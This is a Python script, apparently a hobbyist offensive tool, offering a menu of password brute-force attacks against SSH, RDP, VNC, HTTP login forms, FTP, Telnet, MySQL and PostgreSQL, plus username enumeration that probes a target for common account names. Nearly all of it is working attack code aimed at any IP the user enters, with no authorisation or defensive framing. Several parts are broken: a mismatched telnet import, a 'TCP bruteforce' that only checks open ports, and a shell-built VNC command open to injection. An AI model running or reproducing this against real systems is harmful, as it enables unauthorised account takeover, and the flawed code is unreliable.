import os
import sys
import time
import socket
import subprocess
from ftplib import FTP
import requests
import paramiko
import mysql.connector
import psycopg2
import telnetlib3

logo = r"""

      ___.                 __                     _____                                            ___    
      \_ |_________ __ ___/  |_  ____           _/ ____\___________   ____  ___________        /\  \  \   
       | __ \_  __ \  |  \   __\/ __ \   ______ \   __\/  _ \_  __ \_/ ___\/ __ \_  __ \       \/   \  \  
       | \_\ \  | \/  |  /|  | \  ___/  /_____/  |  | (  <_> )  | \/\  \__\  ___/|  | \/       /\    )  ) 
       |___  /__|  |____/ |__|  \___  >          |__|  \____/|__|    \___  >___  >__|          )/   /  /  
           \/                       \/                                   \/    \/                  /__
     
                         fully built by mv4z 100% not skidded aha

"""

def menu():
    return """
           --------------------------------------------------------
           
           │  OPTION    PORT(S)             SERVICE             │                      
           │  ======    ========            ========            │
           │                                                    │
           │    1        22/tcp              ssh 🔌             │
           │    2        ANY PORT            tcp 🔌             │
           │    3        3389/tcp            rd 🖥️              │
           │    4        5900/tcp            vnc 👁️             │         
           │    5        80,443,8080/tcp     http/https 🌐      │
           │    6        21/tcp              ftp 📁             │
           │    7        23/tcp              telnet 📟          │
           │    8        3306/tcp            mysql 🐬           │
           │    9        5432/tcp            postgresql 🐘      │
           │   10        WEBSITE             username enum 👤   │
           --------------------------------------------------------

    """
 
def ssh_brute():
    ip = input("Enter target IP address: ")
    passlist_path = input("Enter passlist file path: ")
    username = input("Enter username: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying {len(passwords)} password(s) on {ip}...")

        for password in passwords:
            print(f"Trying password: {password}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(ip, username=username, password=password, timeout=5)
                print(f"✅ SUCCESS! SSH password found: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print("❌ Failed")
                continue
            except Exception as e:
                print(f"Error: {e}")
                continue

        print("❌ Password NOT found in the list.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def tcp_brute():
    ip = input("Enter target IP address: ")
    port = int(input("Enter target port: "))
    passlist_path = input("Enter passlist file path: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTesting TCP connections to {ip}:{port}...")

        for password in passwords:
            print(f"Testing with password: {password}")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((ip, port))
                
                if result == 0:
                    print(f"✅ Port {port} open - Connection successful")
                    sock.close()
                    return
                else:
                    print(f"❌ Port {port} closed")
                    sock.close()
                
            except Exception as e:
                print(f"Error: {e}")

        print("❌ No successful connection found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def rdp_brute():
    ip = input("Enter target IP address: ")
    passlist_path = input("Enter passlist file path: ")
    username = input("Enter username: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying RDP passwords on {ip}...")

        for password in passwords:
            print(f"Testing RDP with password: {password}")
            try:
                # Using xfreerdp for RDP connection
                cmd = [
                    'xfreerdp', 
                    f'/v:{ip}',
                    f'/u:{username}',
                    f'/p:{password}',
                    '/cert:ignore',
                    '+auth-only'
                ]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    print(f"✅ SUCCESS! RDP password found: {password}")
                    return
                else:
                    print("❌ Failed")
            except subprocess.TimeoutExpired:
                print("❌ Connection timeout")
            except Exception as e:
                print(f"Error: {e}")

        print("❌ No RDP password found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def vnc_brute():
    ip = input("Enter target IP address: ")
    passlist_path = input("Enter passlist file path: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying VNC passwords on {ip}...")

        for password in passwords:
            print(f"Testing VNC with password: {password}")
            try:
                # Using vncviewer for VNC connection
                cmd = [
                    'vncviewer', 
                    f'{ip}',
                    '-passwd', 
                    f'<(echo {password})'
                ]
                result = subprocess.run(cmd, shell=True, executable='/bin/bash', 
                                      capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0:
                    print(f"✅ SUCCESS! VNC password found: {password}")
                    return
                else:
                    print("❌ Failed")
            except subprocess.TimeoutExpired:
                print("❌ Connection timeout")
            except Exception as e:
                print(f"Error: {e}")

        print("❌ No VNC password found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def http_brute():
    url = input("Enter target URL (e.g., http://example.com/login): ")
    passlist_path = input("Enter passlist file path: ")
    username = input("Enter username: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying HTTP passwords on {url}...")

        for password in passwords:
            print(f"Testing HTTP with password: {password}")
            try:
                response = requests.post(url, data={'username': username, 'password': password}, timeout=5)
                if response.status_code == 200 and "invalid" not in response.text.lower():
                    print(f"✅ SUCCESS! HTTP password found: {password}")
                    return
                else:
                    print("❌ Failed")
            except Exception as e:
                print(f"Error: {e}")

        print("❌ No HTTP password found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def ftp_brute():
    ip = input("Enter target IP address: ")
    passlist_path = input("Enter passlist file path: ")
    username = input("Enter username: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying FTP passwords on {ip}...")

        for password in passwords:
            print(f"Testing FTP with password: {password}")
            try:
                ftp = FTP(ip)
                ftp.login(username, password)
                print(f"✅ SUCCESS! FTP password found: {password}")
                ftp.quit()
                return
            except Exception:
                print("❌ Failed")
                continue

        print("❌ No FTP password found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def telnet_brute():
    ip = input("Enter target IP address: ")
    passlist_path = input("Enter passlist file path: ")
    username = input("Enter username: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying Telnet passwords on {ip}...")

        for password in passwords:
            print(f"Testing Telnet with password: {password}")
            try:
                tn = telnetlib.Telnet(ip)
                tn.read_until(b"login: ")
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                
                result = tn.read_some()
                if b"Login incorrect" not in result:
                    print(f"✅ SUCCESS! Telnet password found: {password}")
                    tn.close()
                    return
                else:
                    print("❌ Failed")
                    tn.close()
            except Exception as e:
                print(f"Error: {e}")

        print("❌ No Telnet password found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def mysql_brute():
    ip = input("Enter target IP address: ")
    passlist_path = input("Enter passlist file path: ")
    username = input("Enter username: ")

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying MySQL passwords on {ip}...")

        for password in passwords:
            print(f"Testing MySQL with password: {password}")
            try:
                connection = mysql.connector.connect(
                    host=ip,
                    user=username,
                    password=password,
                    connection_timeout=3
                )
                if connection.is_connected():
                    print(f"✅ SUCCESS! MySQL password found: {password}")
                    connection.close()
                    return
            except mysql.connector.Error:
                print("❌ Failed")
                continue
            except Exception as e:
                print(f"Error: {e}")

        print("❌ No MySQL password found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")

def postgresql_brute():
    ip = input("Enter target IP address: ")
    passlist_path = input("Enter passlist file path: ")
    username = input("Enter username: ")
    database = input("Enter database name (default: postgres): ") or "postgres"

    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]

        print(f"\nTrying PostgreSQL passwords on {ip}...")

        for password in passwords:
            print(f"Testing PostgreSQL with password: {password}")
            try:
                connection = psycopg2.connect(
                    host=ip,
                    database=database,
                    user=username,
                    password=password,
                    connect_timeout=3
                )
                print(f"✅ SUCCESS! PostgreSQL password found: {password}")
                connection.close()
                return
            except psycopg2.Error:
                print("❌ Failed")
                continue
            except Exception as e:
                print(f"Error: {e}")

        print("❌ No PostgreSQL password found.")

    except FileNotFoundError:
        print(f"Error: Passlist file '{passlist_path}' not found!")


def slow_type(text, delay=0.0000000001):
    """
    Print text like a typewriter effect.

    :param text: string to print
    :param delay: delay between each character in seconds
    """
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()  # Ensure it prints immediately
        time.sleep(delay)
    print()  # Move to next line at the end

def username_enum():
    print("\n👤 Username Enumeration from IP")
    print("=" * 50)
    
    ip = input("Enter target IP address: ").strip()
    
    if not ip:
        print("❌ Please enter a valid IP address!")
        return
    
    # Common username wordlist (you can load from file instead)
    common_usernames = [
        'admin', 'administrator', 'root', 'user', 'test', 'guest', 'admin123',
        'user1', 'support', 'info', 'webmaster', 'mysql', 'postgres', 'ftpuser',
        'ubuntu', 'debian', 'centos', 'oracle', 'sqladmin', 'backup', 'operator'
    ]
    
    print(f"\nEnumerating usernames on {ip}...")
    print("-" * 50)
    
    # Check which services are available first
    services_to_check = {
        22: 'SSH',
        21: 'FTP', 
        23: 'Telnet',
        3389: 'RDP',
        5900: 'VNC'
    }
    
    open_services = []
    
    print("🔍 Checking for open services...")
    for port, service in services_to_check.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_services.append((port, service))
                print(f"✅ {service} (Port {port}) - OPEN")
            sock.close()
        except Exception as e:
            continue
    
    if not open_services:
        print("❌ No username-based services found open")
        return
    
    print(f"\n🎯 Testing {len(common_usernames)} common usernames...")
    print("-" * 50)
    
    valid_usernames = []
    
    # SSH Username Enumeration
    if any(port == 22 for port, service in open_services):
        print("\n🔐 SSH Username Enumeration:")
        for username in common_usernames:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password='invalid_password', timeout=3)
                ssh.close()
            except paramiko.AuthenticationException:
                # If we get authentication error, username exists but password is wrong
                print(f"✅ Valid SSH username found: {username}")
                valid_usernames.append(('SSH', username))
            except paramiko.SSHException as e:
                if "Authentication failed" in str(e):
                    print(f"✅ Valid SSH username found: {username}")
                    valid_usernames.append(('SSH', username))
            except Exception:
                continue
    
    # FTP Username Enumeration
    if any(port == 21 for port, service in open_services):
        print("\n📁 FTP Username Enumeration:")
        for username in common_usernames:
            try:
                ftp = FTP(ip)
                ftp.login(user=username, passwd='invalid_password')
                ftp.quit()
            except Exception as e:
                if "530" in str(e) and "Login incorrect" in str(e):
                    print(f"✅ Valid FTP username found: {username}")
                    valid_usernames.append(('FTP', username))
                continue
    
    # Telnet Username Enumeration  
    if any(port == 23 for port, service in open_services):
        print("\n📟 Telnet Username Enumeration:")
        for username in common_usernames:
            try:
                tn = telnetlib.Telnet(ip, timeout=3)
                tn.read_until(b"login: ", timeout=3)
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ", timeout=3)
                tn.write(b"invalid_password\n")
                response = tn.read_until(b"Login incorrect", timeout=3)
                tn.close()
                
                if b"Login incorrect" in response:
                    print(f"✅ Valid Telnet username found: {username}")
                    valid_usernames.append(('Telnet', username))
            except Exception:
                continue
    
    # RDP Username Enumeration (Windows)
    if any(port == 3389 for port, service in open_services):
        print("\n🖥️  RDP Username Enumeration:")
        # RDP username enumeration is more complex, usually requires tools like crowbar
        print("⚠️  RDP username enumeration requires specialized tools")
    
    # Summary
    print(f"\n📊 Username Enumeration Summary for {ip}:")
    print("-" * 50)
    
    if valid_usernames:
        print("✅ Valid usernames found:")
        for service, username in valid_usernames:
            print(f"  {service}: {username}")
        
        # Save to file
        try:
            with open(f'usernames_{ip}.txt', 'w') as f:
                f.write(f"Valid usernames for {ip}:\n")
                for service, username in valid_usernames:
                    f.write(f"{service}: {username}\n")
            print(f"\n💾 Results saved to: usernames_{ip}.txt")
        except Exception as e:
            print(f"❌ Could not save results: {e}")
    else:
        print("❌ No valid usernames found")
    
    # Brute force recommendations
    if valid_usernames:
        print(f"\n🎯 Recommended next steps:")
        print("-" * 50)
        services_with_users = set(service for service, username in valid_usernames)
        
        for service in services_with_users:
            if service == 'SSH':
                print("Use Option 1: SSH Bruteforce")
            elif service == 'FTP':
                print("Use Option 6: FTP Bruteforce") 
            elif service == 'Telnet':
                print("Use Option 7: Telnet Bruteforce")
    
    return valid_usernames

# ---------------------------------------------------------------------------

def main():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        slow_type(logo)
        slow_type(menu())

        choice = input("""
\033[92m
    ┌──(root㉿kali)-[~/brute]
    └─>\033[0m """)

        # Handle user choice
        if choice == "1":
            print("\nSelected: SSH bruteforce")
            ssh_brute()
        elif choice == "2":
            print("\nSelected: TCP bruteforce")
            tcp_brute()
        elif choice == "3":
            print("\nSelected: RDP bruteforce")
            rdp_brute()
        elif choice == "4":
            print("\nSelected: VNC bruteforce")
            vnc_brute()
        elif choice == "5":
            print("\nSelected: HTTP bruteforce")
            http_brute()
        elif choice == "6":
            print("\nSelected: FTP bruteforce")
            ftp_brute()
        elif choice == "7":
            print("\nSelected: Telnet bruteforce")
            telnet_brute()
        elif choice == "8":
            print("\nSelected: MySQL bruteforce")
            mysql_brute()
        elif choice == "9":
            print("\nSelected: PostgreSQL bruteforce")
            postgresql_brute()
        elif choice == "10":
            print("\nSelected: PostgreSQL bruteforce")
            username_enum()    
        else:
            print("Invalid choice!")
        
        # Optional: pause before looping again
        input("\nPress Enter to continue...")

if __name__ == "__main__":
  main()
